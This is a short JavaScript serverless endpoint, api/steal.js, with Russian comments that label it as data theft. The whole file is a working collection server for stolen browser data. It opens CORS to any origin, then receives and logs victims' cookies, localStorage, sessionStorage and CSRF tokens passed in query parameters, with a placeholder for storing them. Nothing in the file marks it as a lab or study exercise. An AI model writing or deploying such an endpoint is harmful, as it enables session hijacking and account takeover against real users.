// api/steal.js
export default function handler(req, res) {
  // Разрешаем CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  // Логируем полученные данные
  console.log('=== КРАЖА ДАННЫХ ===');
  console.log('Cookies:', req.query.cookies);
  console.log('LocalStorage:', req.query.local);
  console.log('SessionStorage:', req.query.session);
  console.log('CSRF:', req.query.csrf);
  console.log('=====================');

  // Сохраняем данные в файл или базу данных (опционально)
  // ...

  res.status(200).json({ status: 'ok', message: 'Data received' });
}